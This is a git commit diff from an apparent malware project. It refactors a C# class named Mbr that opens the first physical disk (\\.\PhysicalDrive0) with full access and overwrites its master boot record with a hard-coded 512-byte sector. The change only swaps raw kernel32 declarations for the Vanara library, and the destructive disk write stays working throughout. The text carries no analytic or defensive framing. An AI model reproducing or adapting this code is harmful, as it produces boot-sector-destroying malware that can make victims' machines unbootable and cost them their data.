2f309f1297e01d570e0fc2ca1d0251c25006df00
CYBERWARE <t3nx1ltiwzao123@gmail.com>
2024-12-13 23:25:17 -0300

    SOURCE

--- SOURCE CODE/Mbr.cs
+++ SOURCE CODE/Mbr.cs
@@ -1,30 +1,12 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Runtime.InteropServices;
-using System.Text;
+using System;
+using static Vanara.PInvoke.Kernel32;
+using Vanara.PInvoke;
+using System.IO;
 
 namespace Puspula
 {
     public class Mbr
     {
-        [DllImport("kernel32")]
-        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
-    IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-
-        [DllImport("kernel32")]
-        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
-            out uint lpNumberBytesWritten, IntPtr lpOverlapped);
-
-        private const uint GenericRead = 0x80000000;
-        private const uint GenericWrite = 0x40000000;
-        private const uint GenericExecute = 0x20000000;
-        private const uint GenericAll = 0x10000000;
-
-        private const uint FileShareRead = 0x1;
-        private const uint FileShareWrite = 0x2;
-        private const uint OpenExisting = 0x3;
-        private const uint FileFlagDeleteOnClose = 0x40000000;
         private const uint MbrSize = 512u;
 
         public static void MbrInit()
@@ -62,8 +44,8 @@ namespace Puspula
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA};
 
-            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
-                OpenExisting, 0, IntPtr.Zero);
+            var mbr = CreateFile("\\\\.\\PhysicalDrive0", Kernel32.FileAccess.GENERIC_ALL, FileShare.Read | FileShare.Write, null,
+                FileMode.Open, 0, HFILE.NULL);
             WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
         }
     }
